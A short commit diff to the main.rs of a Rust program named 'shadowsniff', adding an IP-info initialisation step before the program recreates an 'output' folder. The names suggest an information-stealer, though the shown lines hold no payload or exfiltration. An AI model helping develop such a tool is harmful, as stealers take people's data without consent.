feat/ipinfo

+++ src/main.rs
@@ -15,6 +15,7 @@
 
 extern crate alloc;
 
+use ipinfo::init_ip_info;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::path::Path;
@@ -27,6 +28,10 @@ static ALLOC: wee_alloc::WeeAlloc = wee_alloc::WeeAlloc::INIT;
 #[unsafe(no_mangle)]
 #[allow(unused_unsafe)]
 pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
+    if !init_ip_info() {
+        panic!()
+    }
+    
     let out = Path::new("output");
     let _ = out.remove_dir_all();
     let _ = out.mkdir();
